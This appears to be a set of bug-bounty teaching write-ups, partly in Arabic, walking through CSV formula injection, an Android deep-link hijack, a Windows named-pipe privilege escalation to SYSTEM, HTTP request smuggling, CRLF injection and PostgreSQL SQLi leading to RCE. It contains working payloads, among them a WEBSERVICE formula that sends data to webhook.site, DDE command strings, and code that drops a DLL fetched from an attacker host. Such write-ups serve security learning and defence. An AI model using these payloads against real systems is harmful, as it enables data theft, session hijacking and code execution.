summary_en: A user‑controlled campaign name is written directly into a CSV export, allowing Excel formulas or DDE commands to run when an admin opens the file, leading to data exfiltration or command execution.

lesson.cause: The application takes the campaign name (a plain‑text field) and writes it verbatim into a CSV file that any user can download. No sanitization or escaping of leading characters such as =,+,-,@ is performed, so the value can become a spreadsheet formula. Because the platform is multi‑user, a low‑privilege attacker can store the malicious value and a higher‑privilege admin later exports and opens the CSV, triggering the formula. This stored injection is the root cause for both the no‑click WEBSERVICE exfiltration and the DDE command‑execution payloads.
lesson.walkthrough:
RECON
Step 1: Identify a writable text field that ends up in a CSV export.
Why: The campaign name field is user‑controlled and appears unchanged in the exported file (definition: a CSV export is a file where rows are separated by commas and newlines).

Step 2: Verify that the exported CSV is opened in Microsoft Excel on Windows.
Why: Excel treats cells that start with =,+,-,or @ as formulas (definition: a formula is a piece of code that Excel evaluates).

EXPLOITATION – No‑click exfiltration
Step 3: As the attacker, set the campaign name to the WEBSERVICE payload.
Payload: =WEBSERVICE("https://webhook.site/abcd1234?x="&CONCAT(B2:R2))
Why: "=WEBSERVICE" tells Excel to perform an HTTP GET request (definition: HTTP request is a message sent from a client to a server). The CONCAT function joins all cells B2 through R2, so the victim’s row data is appended to the URL query string.

Step 4: A victim (admin) exports the campaigns to CSV and opens the file in Excel.
Why: Opening the file triggers Excel to evaluate the formula immediately (definition: evaluation is the process of calculating the result of a formula).

Step 5: Observe the inbound request on the attacker‑controlled webhook site.
Why: The victim’s Excel performed the GET request, sending the concatenated cell data, the victim’s public IP, and the Excel User‑Agent header to the attacker server.

EXPLOITATION – DDE command execution (optional)
Step 6: As the attacker, set the campaign name to a DDE payload.
Payload: =cmd|'/C calc'!A0
Why: "=cmd|" invokes the DDE protocol (definition: DDE is a Windows feature that lets applications exchange data). The string after the pipe tells Windows to run the command "calc" (Calculator). The "!A0" suffix is required syntax for DDE.

Step 7: Victim exports and opens the CSV on a Windows Excel where DDE is enabled.
Why: Excel parses the cell as a DDE link and launches the specified command, resulting in OS‑level execution.

Step 8: (Variant) Use a leading‑character trick if the stored value must not start with =.
Payload: +cmd|'/C notepad'!A0
Why: The leading "+" is also interpreted by Excel as a formula starter, allowing the DDE payload to be delivered.

IMPACT
Step 9: Note that the WEBSERVICE payload leaks the victim’s username, OS version, Excel version, public IP, and spreadsheet contents.
Why: INFO and CELL functions can retrieve environment details, and the HTTP request automatically includes IP and User‑Agent.

Step 10: Recognize that on older or mis‑configured Excel installations, the DDE payload gives full command‑execution as the victim’s Windows user.
Why: No additional user interaction is required beyond opening the file; the command runs with the privileges of the logged‑in user.
lesson.takeaway: When reviewing any feature that exports user‑controlled text to CSV, check whether the output is escaped for leading =,+,-,@ characters. Look for multi‑user workflows where a low‑privilege user can influence data that a higher‑privilege user later opens in a spreadsheet. Tools like Burp Suite or OWASP ZAP can capture the CSV and reveal raw values. Variants of this bug appear in PDF or ODS exports that also support formulas. A common beginner mistake is assuming that because the export is a static file, it cannot be used for code execution; remember that spreadsheet programs interpret certain prefixes as executable formulas.

title: Hijacking Your VPN with one Deep Link
summary_en: An exported Android activity in a VPN client allowed malicious apps to supply a custom backend server via an unvalidated deep link parameter, leading to the theft of sensitive device and user data.

lesson.cause: The vulnerability is caused by the app exporting activities—components accessible to other apps—that process deep links (URLs that open apps) without validation. Specifically, the 'WebLoginCallbackActivity' and 'WebCallbackHandlerActivity' accept a 'fqdn' parameter (a server address) from any incoming Intent (a message between apps). Because the app fails to verify that the link originated from its own login process or that the hostname belongs to a trusted domain, it allows a local malicious app to redirect the VPN's registration traffic to an attacker-controlled server.
lesson.walkthrough:
RECONNAISSANCE
1. The researcher obtains the APK (the Android app file) and decompiles it (turns it back into readable code) using a tool called jadx.
2. They search the 'AndroidManifest.xml' (the app's configuration file) for 'exported' activities, which are screens that any other app on the device can start.
<activity android:name=".ui.WebLoginCallbackActivity" android:exported="true">
Why: Exported activities are the primary entry points for local attacks on Android because they allow external apps to send them data.

DISCOVERY
3. They find that 'WebLoginCallbackActivity' uses 'getIntent().getData()' to read a deep link (a special URL that opens an app screen).
4. The code extracts a parameter (a piece of data in the URL) called 'fqdn' (the server's web address).
String fqdn = data.getQueryParameter("fqdn");
Why: This parameter tells the app which server it should talk to for its initial setup and registration.
5. The researcher notices the app uses this 'fqdn' as its base URL (the main address for all its internet requests) without any validation.
Why: Without an allowlist (a list of approved addresses), the app will send sensitive data to any address provided in the URL.

EXPLOITATION
6. The researcher writes a PoC (Proof of Concept, a small test app) that only requires the 'INTERNET' permission.
<uses-permission android:name="android.permission.INTERNET" />
Why: This demonstrates that the attack does not require high-level system privileges or 'root' access.
7. The PoC app creates a fake deep link URL pointing to the attacker's server.
Uri uri = Uri.parse("vpnclient://callback?fqdn=attacker-server.com");
Why: This URL mimics the real login response but replaces the legitimate server with one controlled by the attacker.
8. The PoC app sends an Intent (a message between apps) directly to the target VPN app's exported activity.
intent.setComponent(new ComponentName("com.vendor.vpnclient", "...WebLoginCallbackActivity"));
Why: This forces the VPN app to open and process the malicious URL immediately.
9. The researcher opens the real VPN app and taps 'Login' to start the 180-second 'window' where the app accepts callbacks.
Why: The app only listens for these links for 3 minutes after a login starts, but an automated app can easily trigger the exploit within this time.
10. While the login browser is open, the researcher runs the PoC app to fire the forged callback.
Why: The PoC app sends the fake link while the VPN app is still waiting for the real one, winning the race.

IMPACT
11. The VPN app accepts the fake server address and sends a 'registration' request to the attacker's server.
GET /portal/services?action=discover&username=5550199&device_mac=00:11:22...
Why: The app thinks it is talking to its own server, so it automatically transmits the user's private information.
12. The attacker captures the user's MSISDN (phone number), MAC address (hardware ID), and GUID (unique device ID).
Why: This data provides a permanent fingerprint of the user and their device, which can be used for tracking or further attacks.
lesson.takeaway: When hunting for Android bugs, always audit 'exported' activities in the manifest, especially those handling 'android.intent.action.VIEW'. Look for parameters that define hostnames, URLs, or file paths using 'getIntent().getData()'. A common signal is when these parameters are used to configure network clients like Retrofit or OkHttp. Variants of this bug include 'Intent Redirection,' where an app is forced to launch a private activity, or 'File Provider' leaks. Avoid the mistake of assuming that only the system browser can trigger your deep links; any app on the device can send a direct Intent to an exported activity.

title: From Named Pipe to SYSTEM: How I Found a Local Privilege Escalation in a Major Windows Application
summary_en: An overly permissive named‑pipe ACL allowed an unprivileged user to talk to a SYSTEM service, which exposed a .NET Remoting object that could write arbitrary files as SYSTEM and later load a malicious DLL to spawn a SYSTEM shell.

lesson.cause: The service created a named pipe with FILE_ALL_ACCESS for Everyone, giving any local user full read/write rights. The pipe was used by a .NET Remoting endpoint that did not enforce any authentication or authorization checks. The exposed Remoting object (ElevatedBitsFileTransferor) accepted a DestinationFilePath parameter without validating the path, allowing arbitrary file writes as the SYSTEM account. The attacker then leveraged a known DLL‑search hijack (HID.DLL) that is loaded by osk.exe on the lock screen, completing the privilege‑escalation chain.
lesson.walkthrough:
RECON
Step 1: Scanned all named‑pipe ACLs on the machine.
accesschk.exe -accepteula -w \pipe\* 2>$null
Why: accesschk lists the permissions (ACL) of each pipe; the output showed a pipe with FILE_ALL_ACCESS for Everyone, which is unusual.

Step 2: Identified the pipe with overly permissive ACL.
\\.\Pipe\UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0
Why: The pipe name indicates it belongs to an update service; the ACL line "RW Everyone FILE_ALL_ACCESS" confirms any user can read/write.

Step 3: Determined which process owned the pipe.
handle.exe -a "UpdateService"
Why: handle.exe shows the process ID (pid 2992) and executable (UpdateService.exe) that created the pipe.

Step 4: Checked the service’s run account.
sc.exe qc UpdateServiceV5
Why: The service runs as LocalSystem (a highly privileged account), meaning anything it does runs with SYSTEM rights.

DISCOVERY
Step 5: Tested if a normal user could connect to the pipe.
$pipe = New-Object System.IO.Pipes.NamedPipeClientStream(".", "UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0", [System.IO.Pipes.PipeDirection]::InOut)
$pipe.Connect(3000)
$pipe.IsConnected
Why: PowerShell creates a client stream to the named pipe; IsConnected returned True, proving the pipe accepts connections without authentication.

Step 6: Identified the technology used by the service.
strings.exe UpdateService.exe | find "v4.0.30319"
Why: strings extracts readable text; the presence of ".NET Framework 4.8" indicates the service is a .NET assembly.

Step 7: Loaded the service binary into dnSpy to view source.
Why: dnSpy decompiles .NET assemblies, allowing us to read the C# code.

Step 8: Found the Remoting endpoint registration.
url = "ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor"
Why: The URL shows a .NET Remoting object exposed over the named pipe.

EXPLOITATION
Step 9: Connected to the Remoting object from an unprivileged C# client.
ChannelServices.RegisterChannel(new IpcClientChannel(), false);
string url = "ipc://UpdateServicev5.Spc.Esd.Client.Common.Utilities.5.3.2.0/ElevatedBitsFileTransferor";
ElevatedBitsFileTransferor remote = (ElevatedBitsFileTransferor)RemotingServices.Connect(typeof(ElevatedBitsFileTransferor), url);
Console.WriteLine("Available: " + remote.Available);
Why: RegisterChannel creates a client channel; RemotingServices.Connect returns a proxy to the remote object, proving we can call its methods.

Step 10: Invoked the file‑write method to drop a file into a SYSTEM‑owned directory.
remote.StartForegroundJobInBackground("job1", new List<FileResource>{ new FileResource{ DestinationFilePath = "C:\\Windows\\System32\\test.txt", RemoteFilePath = "http://attacker/payload" } });
Why: The method forwards the DestinationFilePath to BITS, which runs as SYSTEM; no path validation lets us write anywhere.

Step 11: Verified the file exists and is owned by SYSTEM.
Why: The file appears in System32 with SYSTEM ownership, confirming an arbitrary SYSTEM file‑write primitive.

Step 12: Chose a DLL‑load hijack location (HID.DLL) used by osk.exe on the lock screen.
Why: ProcMon showed osk.exe attempts to load HID.DLL from "C:\Program Files\Common Files\microsoft shared\ink\"; the DLL does not exist by default, making it hijackable.

Step 13: Used the same remote object to write a malicious DLL to the hijack path.
remote.StartForegroundJobInBackground("job2", new List<FileResource>{ new FileResource{ DestinationFilePath = "C:\\Program Files\\Common Files\\microsoft shared\\ink\\HID.DLL", RemoteFilePath = "http://attacker/malicious.dll" } });
Why: The same unrestricted write lets us place our DLL where osk.exe will load it.

Step 14: Triggered the DLL load without reboot by opening the lock‑screen On‑Screen Keyboard.
Win+L → Ease of Access → On‑Screen Keyboard
Why: osk.exe runs as SYSTEM on the lock screen and loads HID.DLL; our malicious DLL executes, spawning a SYSTEM cmd.exe.

IMPACT
Step 15: Obtained an unrestricted SYSTEM command prompt on the lock screen.
Why: The DLL executed with the privileges of the loading process (SYSTEM), giving full control over the machine.
lesson.takeaway: When hunting Windows privilege‑escalation bugs, always enumerate named‑pipe ACLs; a pipe with FILE_ALL_ACCESS for Everyone is a red flag. Look for services running as LocalSystem that expose .NET Remoting or other IPC mechanisms without authentication. Check any method that accepts a file path for missing validation – it often leads to arbitrary SYSTEM writes. Common variants include WCF services over pipes, COM/DCOM objects, or RPC endpoints that trust the caller. Beginners often forget to verify the service’s run account, causing them to miss the privilege gap.

title: HTTP Request Smuggling (TE.CL) to Session Hijacking via GraphQL
summary_en: An HTTP Request Smuggling vulnerability allowed an attacker to poison a back-end connection and capture a victim's full request. By redirecting this data into a GraphQL mutation, the attacker stored the victim's session cookies in their own support chat history.

lesson.cause: The vulnerability was caused by a TE.CL desynchronization (a state where two servers disagree on where a request ends) between a front-end proxy and a back-end server. The front-end prioritized the Transfer-Encoding header (a header telling the server data is sent in pieces), while the back-end prioritized the Content-Length header (a header telling the server the exact size of the data). This mismatch allowed the researcher to leave a 'partial' request hanging on the back-end connection. Furthermore, the /graphql endpoint (a specific web address for data queries) accepted form-encoded data, which is less strict than JSON, allowing the next user's request to be appended to a text parameter without crashing the application.
lesson.walkthrough:
RECON
Step 1: The researcher identified the target's infrastructure, noting a front-end proxy (a middleman server) and a back-end application server.
Step 2: They tested for Request Smuggling (a technique to interfere with how a website processes sequences of HTTP requests).
DISCOVERY
Step 3: The researcher confirmed a TE.CL mismatch where the front-end used Transfer-Encoding and the back-end used Content-Length.
Step 4: They attempted to smuggle a request to a standard JSON API endpoint.
Step 5: They observed that the JSON parser (a tool that reads data in a specific structured format) failed because the victim's request broke the JSON structure.
Step 6: They searched for alternative endpoints and found /graphql, which accepted application/x-www-form-urlencoded data (a format where data is sent as key-value pairs like name=value).
EXPLOITATION
Step 7: The researcher crafted a 'trigger' request to desynchronize the connection.
POST /api/stich_transitionState?localeCode=en-US HTTP/1.1
Host: target.example.com
Transfer-Encoding: chunked
Content-Length: [Calculated Length]

0
Why: The front-end sees the '0' and thinks the request is finished, but the back-end is told by Content-Length to keep waiting for more data.
Step 8: They appended a second, 'smuggled' request immediately after the trigger.
POST /graphql HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Why: This smuggled request (a hidden request tucked inside another) is what the back-end will process next.
Step 9: They used a GraphQL mutation (a type of request used to change or save data) that updates a support message.
operationName=updateMobileContact_deprecated&variables[request][message][text]=HIJACKED_REQUEST_BEGINS:
Why: This parameter (a piece of data sent to the server) will act as a container for the victim's data.
Step 10: They set a very large Content-Length for the smuggled GraphQL request.
Content-Length: [SMUGGLED_BODY_LENGTH + VICTIM_REQUEST_LENGTH]
Why: This makes the back-end 'hungry,' meaning it stays open and waits to swallow the next request that arrives on the connection.
Step 11: The researcher sent the combined payload (the actual malicious data being sent) to the server.
Step 12: A victim user sent a legitimate request to the server on the same connection.
GET /path/inbox HTTP/1.1
Host: target.example.com
Cookie: session_cookie=VICTIM_SESSION_VALUE
Why: Because the back-end was still 'hungry' from Step 10, it treated the victim's request as the continuation of the attacker's message text.
IMPACT
Step 13: The application processed the mutation, saving the attacker's message.
Step 14: The saved message now contained the victim's full request, including their Cookie (a small ID tag used to identify a logged-in user).
Step 15: The researcher logged into their own account and opened the support conversation.
Step 16: They viewed the message and successfully extracted the victim's session cookie.
Step 17: Using the stolen cookie, the researcher performed session hijacking (taking over another user's active session) to access the victim's account.
lesson.example: Imagine a fictional site target.example.com that has a 'Update Profile Bio' feature. The server is vulnerable to TE.CL smuggling. An attacker sends a request to update their bio, but sets the Content-Length to be 500 bytes larger than the actual bio text. The request ends with 'bio=My bio is: '. When a victim user visits the site and their browser sends a request like 'GET /dashboard HTTP/1.1' followed by their private 'Cookie: session=12345', the server thinks this text is part of the attacker's bio. The attacker then simply views their own profile, and their bio now displays the victim's full request and session cookie.
lesson.takeaway: When hunting for request smuggling, always look for endpoints that store user-supplied text, such as chat systems, profile bios, or support tickets. These are perfect 'sinks' for capturing smuggled data. If a JSON endpoint fails because the smuggled data is not valid JSON, look for form-encoded or GraphQL alternatives which are often more flexible. Use tools like Burp Suite's HTTP Request Smuggler to automate the detection of TE.CL and CL.TE mismatches. A common mistake is assuming a '400 Bad Request' means the site is not vulnerable; it often just means your payload needs adjustment to be syntactically valid for the application layer.
lesson.fix: To fix this, the organization should ensure that the front-end proxy and the back-end server use the same HTTP parsing library or configuration to avoid desynchronization. The most effective solution is to use HTTP/2 for the entire connection chain, as it uses a binary framing mechanism that eliminates the ambiguity of request boundaries. Additionally, the back-end should be configured to reject any request that contains both a Content-Length and a Transfer-Encoding header. Example fix in a configuration: 'http_protocol_options { strict_header_validation: true; }' or ensuring the proxy normalizes requests before forwarding them.

excerpt: A request parser disagreement between a front-end proxy and a back-end server can look like a simple `400 Bad Request` or connection desynchronization issue. The real security impact appears when that desynchronization can be turned into a reliable cross-request interaction. During an authorized assessment of web application, I found a TE.CL HTTP Request Smuggling condition. The front-end processed the request using: httpTransfer-Encoding: chunked while the back-end interpreted the request boundary using: httpContent-Length That mismatch allowed a crafted request to desynchronize the back-end

title: 52 Request Smuggling Reports. Two Rules Decide the Payout.
summary_en: An analysis of all 52 disclosed HTTP request smuggling reports on HackerOne (21 paid, $53,040 total) reveals two payout rules — the storefront sets the floor, the proven attack chain sets the ceiling — and shows how CRLF-powered desync turns header injection into full request smuggling.
summary_ar: تحليل لـ 52 تقرير HTTP Request Smuggling منشور على HackerOne (21 تقرير مدفوع بإجمالي $53,040) يكشف قاعدتين تحكمان قيمة المكافآت — الـ storefront يحدد الحد الأدنى وسلسلة الاستغلال المثبتة تحدد الحد الأقصى — ويوضح كيف تحوّل هجمات CRLF-powered desync حقن الهيدر إلى Request Smuggling كامل.

lesson.cause_ar: الـ root cause الحقيقي هو اختلاف تفسير حدود الطلبات بين الـ front-end والـ back-end. المقال بيوضح إن إعدادات Nginx زي `proxy_pass http://backend$uri;` بتعمل URL-decode للمسار، فـ `%0d%0a` في الـ URL بتبقى سطرين جديدين حقيقيين (CRLF). ولما ييجي سطرين CRLF متتاليين، الـ hop اللي بعده بيشوفهم كحدود طلب جديد — يعني المهاجم يقدر يحقن طلب كامل جوه طلب تاني. الافتراض الغلط اللي فتح الباب هو إن الـ URL-encoding في الـ path مجرد ترميز غير ضار، بينما في الحقيقة بيتم فك ترميزه قبل ما يوصل للـ backend فيتحول لسلوك خطير.
lesson.walkthrough_ar: المقال بيحكي إن الكاتب قرر يرجع للمصدر الأصلي: كل الـ 52 تقرير Request Smuggling المنشور على HackerOne — 21 منهم اتدفعوا بإجمالي $53,040. السياق إن PortSwigger نشرت في 5 أغسطس بحث "CRLF-Powered Desync Attacks" وقدّموه في Black Hat USA و DEF CON، والادعاء إن header injection أقل من قيمته بكتير. التقنية الأساسية: إعدادات Nginx زي `proxy_pass http://backend$uri;` بتفك ترميز المسار، فحقن `%0d%0a` في الـ URL بيبقى سطرين CRLF حقيقيين، وسطرين CRLF متتاليين بالنسبة للـ hop اللي بعده هما مجرد حدود طلب جديد. من هنا بيبدأ الـ desync: response queue poisoning، و request tunnelling يعدّي على الـ access controls، و cache poisoning، و cookie tossing. بعدها الكاتب حلل المكافآت وطلع بقاعدتين: الـ storefront بيحدد الحد الأدنى — نفس فئة الـ parser-quirk جابت $4,660 عن طريق Internet Bug Bounty و $250 بس عن طريق برنامج الـ vendor نفسه. والـ proven chain بيحدد السقف — الـ desync لوحده ما عدّاش $750، لكن سرقة كلمات المرور والـ tokens وتجاوز الـ access controls وصلت من $3,000 لـ $7,500. وفي النهاية: خمسة أنماط (patterns) بتغطي كل التقرير، وواحد من النتائج كان bounty بقيمة $20,000 على اكتشاف في شركة اتصالات.
lesson.takeaway_ar: الدرس العملي: لما تلاقي أي header injection أو CRLF في مسار الـ URL، متستهونش بيه — جرّب تحوله لـ desync كامل. علامات الخطر: proxy بيعمل URL-decode للمسار زي `proxy_pass http://backend$uri;`، أو أي اختلاف بين طريقة تفسير الـ front-end والـ back-end لحدود الطلبات. جرّب حقن `%0d%0a` متتاليين ولاحظ لو في طلب تاني بيتنفذ أو الـ response بيتسمم. وكمان افتكر إن قيمة الـ report مش بس في الـ bug نفسه — الـ impact المثبت (سرقة tokens، تجاوز access controls) هو اللي بيحدد السقف، فدايمًا اشتغل على إثبات سلسلة استغلال كاملة مش مجرد desync معزول.
lesson.fix_ar: الإصلاح الصح بيبدأ من إعدادات الـ proxy: متخليش Nginx يفك ترميز المسار قبل ما يبعت للـ backend — أو على الأقل ارفض أو عطّل أي `%0d%0a` في الـ path قبل الـ proxy_pass. كمان لازم يكون فيه تطبيع (normalization) للـ input عند الـ edge، وفحص إن الـ CRLF مبيوصلش للـ backend كحدود طلب. والأهم: الـ front-end والـ back-end لازم يتفقوا على نفس قواعد تحديد نهاية الطلب (Content-Length vs Transfer-Encoding)، عشان مفيش فراغ بينهم يقدر المهاجم يستغله. ولو في header injection في أي مكان، عالج الـ root cause نفسه بدل ما تسد ثغرة واحدة.

title: World of SELECT-only PostgreSQL Injections
summary_en: A trivial SELECT-only SQL injection in a Golang/PGX API — where stacked queries were blocked by prepared statements — was escalated to PostgreSQL superuser and full RCE by abusing lo_import/lo_export to rewrite table filenodes and postgresql.conf.
summary_ar: ثغرة SQL injection بسيطة من نوع SELECT-only في API مبني على Golang/PGX — حيث مُنعت الـ stacked queries عبر prepared statements — تم تصعيدها إلى صلاحيات superuser على PostgreSQL ثم RCE كاملة عبر استغلال دوال lo_import/lo_export لإعادة كتابة ملفات filenode وملف postgresql.conf.

lesson.cause_ar: الـ root cause الأساسي إن التطبيق كان بياخد الـ query parameter `id` من المستخدم ويدمجه جوه الـ SQL query مباشرة عبر `fmt.Sprintf` من غير أي parameterization — يعني أي قيمة في الـ parameter بتتفسر كجزء من الاستعلام نفسه. المشكلة اتعمّقت لما طلع إن الـ PGX driver بيحوّل أي query لـ prepared statement تحت الغطا، فبيمنع الـ stacked queries نهائيًا، وده خلا الباحث محبوس في SELECT واحد بس. لكن الافتراض الخاطئ الأكبر كان من ناحية PostgreSQL نفسها: الدوال الجاهزة `lo_import` و`lo_export` متاحة للسوبر يوزر افتراضيًا وبتسمح بقراءة وكتابة ملفات على السيرفر، والـ DBMS شغال تحت OS user اسمه `postgres` عنده صلاحية الوصول لملفات الـ data والـ config بتاعته. فالفجوة الحقيقية مش بس في الـ SQLi — إنما في إن نظام قاعدة البيانات نفسه بيدي للـ SELECT injection أدوات للوصول للملفات، وده اللي فتح باب الـ privesc والـ RCE.
lesson.walkthrough_ar: الباحث كان بيفحص API عام بيخدم كـ public data repository — تطبيق مكتوب بـ Golang مع إطار Gin ودرايفر PGX، وكل البيانات متاحة لأي حد يقراها لكن التعديل محصور في ناس موثوقة. لاحظ إن الـ endpoint `/phrases` بياخد parameter اسمه `id`، فجرّب يلعب بيه: `id=1` رجّع صف واحد، و`id=-1` رجّع مصفوفة فاضية، و`id=-1 OR 1=1` رجّع كل الصفوف — يعني SQLi مؤكدة في السطر `SELECT id, text FROM phrases WHERE id=%s`. أول خطة كانت الـ stacked queries، فجرّب `id=-1; SELECT pg_sleep(5)` لكن السيرفر ردّ بخطأ `ERROR: cannot insert multiple commands into a prepared statement (SQLSTATE 42601)` — طلع إن PGX بيحوّل كل query لـ prepared statement تحت الغطا فبيمنع تنفيذ أكتر من أمر. جرّب كمان `id=-1 OR (UPDATE * phrases SET text='lol')` و`id=-1 OR (DELETE * FROM phrases)` ففشلوا بـ syntax error، لكن `id=-1 OR (SELECT 1)=1` اشتغلت تمام — يعني الـ SELECT المتداخلة مسموحة. بما إن قراية البيانات نفسها مش إنجاز (البيانات عامة)، دور على دوال PostgreSQL الجاهزة اللي ممكن تساعد، ولقى `lo_import` و`lo_export` — دوال Large Objects بتسمح بقراءة ملف من السيرفر جوه الـ DB وبالعكس، ومتاحة للسوبر يوزر افتراضيًا. عشان يعرف إيه الملفات المتاحة، شاف `/etc/passwd` ولقى `postgres:x:129:129::/var/lib/postgresql:/bin/bash`، وبعدين شغّل `find / -uid 129 -type f -perm -600` ولقى ملفات مهمة زي `/var/lib/postgresql/data/postgresql.conf` و`pg_hba.conf` و`pg_ident.conf` وملفات data تبع قاعدة البيانات. من هنا بدأ التصعيد اللي المقال بيشرحه على مراحل: تحديد الـ target table، البحث عن الـ filenode بتاعها، قراية وتنزيل الـ filenode، استخراج الـ table metadata، تعديل الملفات offline عشان يخلي نفسه superuser، وبعدين Flushing الـ Hot storage عشان التعديل يظهر. وللوصول للـ RCE: قراية `postgresql.conf` الأصلي، اختيار parameter مناسب للاستغلال، compile مكتبة خبيثة، رفعها للسيرفر، وإعادة تحميل الـ config — وهي تقنية مبنية على اكتشافات Denis Andzakovic وsylsTyping من 2021 و2022.
lesson.takeaway_ar: أول درس: لما تلاقي SQLi ويفشل الـ stacked queries بسبب prepared statements، متستسلمش — في PostgreSQL الـ SELECT-only ممكن توصل لأبعد من كده بكتير. العلامات اللي بتدل على النمط ده: رسالة خطأ زي `cannot insert multiple commands into a prepared statement` اللي بتكشف سلوك الـ driver، وقدرتك على استدعاء دوال جوه SELECT متداخلة، وكون الـ DB user عنده صلاحيات superuser. لو الدوال `lo_import`/`lo_export` أو `pg_read_file` شغالة، يبقى عندك قراية وكتابة ملفات على السيرفر — وده بيكفي يبدأ سلسلة تصعيد كاملة. النمط ده بيتكرر في أي هدف PostgreSQL فيه injection مقيدة بـ SELECT، خصوصًا لما تكون قاعدة البيانات شغالة تحت OS user بصلاحيات واسعة على ملفاتها.
lesson.fix_ar: الإصلاح الأول والأهم على مستوى التطبيق: استخدام parameterized queries بدل دمج المدخلات في الـ query string — في PGX المفروض تمرر القيم كـ arguments لـ `pool.Query` بدل `fmt.Sprintf`، وده بيقتل الـ SQLi من جذوره. على مستوى قاعدة البيانات، لازم الـ DB role المستخدمة في التطبيق تكون غير superuser، وتتسحب منها صلاحية استدعاء الدوال الخطيرة زي `lo_import` و`lo_export` و`pg_read_file`، أو تُحرم من `pg_largeobject` لو مش محتاجاها. كمان الـ OS user اللي شغال عليه PostgreSQL لازم يكون بحساب منفصل بصلاحيات محدودة، وملفات الـ config زي `postgresql.conf` و`pg_hba.conf` متبقاش قابلة للكتابة من الـ DBMS نفسه. وأخيرًا، لو التطبيق بيخدم بيانات عامة، أي injection حتى لو SELECT-only لازم تتعامل معاها كحرجة لأنها ممكن تتصعد لـ RCE.

title: Another 1500$: CR/LF Injection
summary_en: A CRLF injection in HuliaHub's authentication flow let an attacker inject %0D%0A into the redirect URL parameter to manipulate HTTP headers and perform malicious actions post-authentication. Reported to the private bug bounty program for a $1,500 payout — the researcher's second CRLF finding there in a month.
summary_ar: ثغرة CRLF injection في آلية الـ authentication بمنصة HuliaHub سمحت للمهاجم بحقن %0D%0A في الـ redirect URL parameter للتلاعب بـ HTTP headers وتنفيذ إجراءات خبيثة بعد تسجيل الدخول. اتقبلت في برنامج bug bounty خاص بمكافأة $1,500 — وهي تاني ثغرة CRLF يلاقيها الباحث في نفس البرنامج خلال شهر.

lesson.cause_ar: الـ root cause إن تطبيق HuliaHub كان بياخد قيمة الـ redirect URL parameter من المستخدم أثناء عملية الـ authentication وبيعكسها في HTTP headers من غير أي sanitization أو encoding. المطور افترض إن الـ parameter ده هيحتوي على URL عادي بس، فمفيش validation على المحتوى، وده خلّى إمكانية حقن حروف الـ CR/LF (%0D%0A) اللي بتترجم كسطر جديد في الـ header. النتيجة إن المهاجم يقدر يضيف headers جديدة أو يعدّل سلوك الـ response بعد تسجيل الدخول، وده بيفتح باب لسلسلة هجمات تانية. حقيقة إن الباحث لقى نفس الثغرة مرتين في نفس البرنامج خلال شهر بتأكد إن المشكلة كانت منهجية في طريقة التعامل مع المدخلات دي مش خطأ فردي.
lesson.walkthrough_ar: الباحث كان بيعمل تقييم أمني على منصة HuliaHub (اسم مستعار لبرنامج bug bounty خاص)، وده كان تاني اكتشاف لثغرة CR/LF في نفس البرنامج خلال شهر واحد — يعني كان عنده خبرة سابقة بنفس النمط. وقت فحص آلية الـ authentication، لفت نظره إن في parameter مسؤول عن الـ redirect بعد تسجيل الدخول، وده النوع اللي بيترجم غالبًا لـ HTTP header في الـ response. جرّب يحقن حروف الـ CR/LF المشفرة %0D%0A جوه قيمة الـ parameter بدل ما يبعت URL عادي. التطبيق ما عملش أي filter أو encoding للحروف دي، فاتعامل معاها كسطر جديد في الـ header وسمح للباحث يتحكم في الـ headers اللي بترجع للمستخدم. النتيجة إن المهاجم يقدر ينفذ إجراءات خبيثة بعد الـ authentication عن طريق التلاعب بالـ response. الثغرة اتقبلت واتصنفت critical واتدفع عنها $1500.
lesson.takeaway_ar: أي parameter بيظهر في تدفق الـ login/SSO واسمه من عيلة redirect (زي redirect، returnUrl، next، callback) يستاهل اختبار CRLF فورًا — جرّب تحقن %0D%0A في قيمته وشوف لو ظهر header جديد في الـ response. العلامة الأقوى إنك لو لقيت CRLF في endpoint واحد، دوّر على نفس النمط في باقي الـ endpoints اللي بتعكس مدخلات في headers، لأن المشكلة غالبًا متكررة في نفس الكود (زي ما حصل هنا: ثغرتين في شهر). كمان راقب الـ response في Burp على مستوى الـ raw headers مش بس الـ browser، لأن أثر الحقن بيبان هناك. ولو الـ redirect بيحصل بعد الـ authentication، اختبر السيناريو كامل لأن الأثر ممكن يكون أعلى من مجرد open redirect.
lesson.fix_ar: الحل الصح إن أي قيمة بتترجم لـ HTTP header لازم تعدي على validation صارمة: ارفض أو strip أي حروف تحكم زي \r و \n (أو %0D و %0A) قبل ما تدخل الـ header. الأفضل كمان إن الـ redirect parameter يبقى whitelist للـ URLs المسموحة بدل ما يستقبل أي قيمة من المستخدم. لو التطبيق محتاج يدعم redirects ديناميكية، استخدم encoding آمن أو دوال جاهزة في الـ framework بترفض القيم غير الصالحة للـ headers. والأهم إن الـ fix يتطبق على كل الـ endpoints اللي بتعكس مدخلات في headers، مش بس اللي اتلاقت فيه الثغرة، عشان نفس النمط متكرر.
